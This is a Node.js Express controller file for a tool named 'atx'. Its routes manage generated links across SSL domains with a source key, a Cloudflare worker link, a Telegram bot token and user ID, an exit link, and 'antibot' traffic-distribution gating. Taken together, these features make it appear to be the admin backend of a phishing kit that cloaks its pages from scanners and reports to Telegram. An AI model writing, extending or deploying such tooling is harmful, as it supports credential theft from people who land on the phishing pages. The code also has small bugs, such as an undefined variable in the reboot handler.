const fs = require('fs')
const { exec } = require('child_process')

const { validationResult } = require('express-validator');
const superagent = require('superagent');
const { info } = require('console');



exports.getLinks = (req, res) => {

    const linkList = []
    let redirectUrl

    let userFileObj = JSON.parse(fs.readFileSync('./atx/config/user.json'))
    const srcKey = userFileObj.SRC_KEY


    const sslFileObj = JSON.parse(fs.readFileSync('./atx/config/ssl.json'))
    sslFileObj.forEach(sslInfo =>  {
        const formattedLink = `https://${sslInfo.domain}/?${srcKey}`
        if (sslInfo.isRedirect) {
            redirectUrl = formattedLink
        } else {
            linkList.push(formattedLink)
        }
        
    })

    let cloudflare_gen_link = userFileObj.CF_WORKER_URL || ''

    const linkObj = {
        links: linkList,
        redirect: redirectUrl,
        cloudflare_link: cloudflare_gen_link
    }

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully fetched all links, No: ${linkList.length}`,
        info: linkObj,
    })

}




exports.getProcessInfo = (req, res) => {

}

exports.execProcessAction = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }


    const execAction = req.body.state

    let execUrl = ''
    if (execAction === 'START') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/start`
    } else if (execAction === 'STOP') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/stop`
    } else if (execAction === 'RESTART') {
        execUrl = `http://localhost:${process.env.PM3_PORT}/restart`
    } else {
        return res.json({
            status: "Error",
            error: 'Invalid Action',
            code: 1,
            message: `Cannot understand the action: ${execAction} given to server...`,
        })
    }

    superagent.get(execUrl)
        .end((err, resp) => {
            if (err) {
                console.error(err)
                    return res.json({
                    status: "Error",
                    error: err,
                    code: 1,
                    message: `Failed to execute action: ${execAction} on server`,
                })
            }
                return res.json({
                status: "Success",
                error: null,
                code: 0,
                message: `Successfully executed action: ${execAction}, Please Restart atx to effect changes`,
                info: execAction,
            })
                    
        })

}

exports.setTelegramID = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const telegramID = req.body.telegramID

    const userFileObj = JSON.parse(fs.readFileSync('./atx/config/user.json'))

    userFileObj.TELEGRAM_USER_ID = telegramID

    fs.writeFileSync('./atx/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Telegram ID to ${telegramID}`,
        info: telegramID,
    })
}

exports.setExitLink = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const exitLink = req.body.exitLink

    const userFileObj = JSON.parse(fs.readFileSync('./atx/config/user.json'))

    userFileObj.EXIT_LINK = exitLink

    fs.writeFileSync('./atx/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Exit Link to ${exitLink}`,
        info: exitLink,
    })
}


exports.setTelegramBot = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }

    const telegramID = req.body.telegramID
    const telegramBotToken = req.body.botToken

    const userFileObj = JSON.parse(fs.readFileSync('./atx/config/user.json'))

    userFileObj.TELEGRAM_USER_ID = telegramID
    userFileObj.TELEGRAM_BOT_TOKEN = telegramBotToken

    fs.writeFileSync('./atx/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully set Telegram ID to ${telegramID}`,
        info: telegramID,
    })
}

exports.changeAntibot = (req, res) => {
    const vResult = validationResult(req);
    const hasErrors = !vResult.isEmpty();
    if (hasErrors) {
            return res.status(402).json(vResult.errors);
    }


    const antibotSwitch = req.body.antibot
    
    let antibotUrl, tdsKey
    
    if (antibotSwitch === false) {
        antibotUrl = 'http://127.0.0.1:3000'

        tdsKey = ''
    
    } else {
        const antibotInfo = req.body.antibotInfo


        const antibotInfoList = antibotInfo.split(';')


        antibotUrl = antibotInfoList[0]

        tdsKey = antibotInfoList[1]


    }


    const userFileObj = JSON.parse(fs.readFileSync('./atx/config/user.json'))

    userFileObj.GATE_KEY = tdsKey

    userFileObj.TDS_URL = antibotUrl


    fs.writeFileSync('./atx/config/user.json', JSON.stringify(userFileObj, '', 4))

    return res.json({
        status: "Success",
        error: null,
        code: 0,
        message: `Successfully changed antibot to ${antibotSwitch}`,
        info: antibotSwitch,
    })
}

exports.setProxy = (req, res) => {

}


exports.getInformation = (req, res) => {
    const userFileObj = JSON.parse(fs.readFileSync('./atx/config/user.json'))

    const infoObj = {}

    infoObj.CURRENT_PROJECT = userFileObj.CURRENT_PROJECT
    infoObj.TELEGRAM_USER_ID = userFileObj.TELEGRAM_USER_ID
    infoObj.TELEGRAM_BOT_TOKEN = userFileObj.TELEGRAM_BOT_TOKEN
    infoObj.BOT_REDIRECT = userFileObj.BOT_REDIRECT
    infoObj.EXIT_LINK = userFileObj.EXIT_LINK

    infoObj.ANTIBOT = userFileObj.GATE_KEY ? 'ON' : 'OFF'

    // infoObj.STATE=  


    return res.json({
        status: "Success",
        error: null,
        code: 0,
        info: `${JSON.stringify(infoObj, '', 4)}`,
        message: 'SErver Status Fetched Sucessfully',
    })
}

exports.rebootInstance = (req, res) => {
    const bashExec = exec('bash scripts/reboot-atx.sh', function(err, stdout, stderr) {
        if (err) {
            console.error("Early Failure for Reboot work...")
            return res.json({
				status: "Error",
				error: "Failed To Reboot and Update the atx Instance ",
				code: code,
				needRestart: false,
				message: 'Failed To Reboot and Update the atx Instance, Check if your vps is active, or try doing from terminal with command "npm run restart"'
			})
        }
      });

    res.json({
        status: "Success",
        error: null,
        code: 0,
        message: 'Successfully rebooted and updated the instance.\n\nPlease Wait 2min before Issuing another command',
        info: 'Successfully rebooted and updated the instance.\n\nPlease Wait 2min before Issuing another command',
    })

    process.exit(0)
}


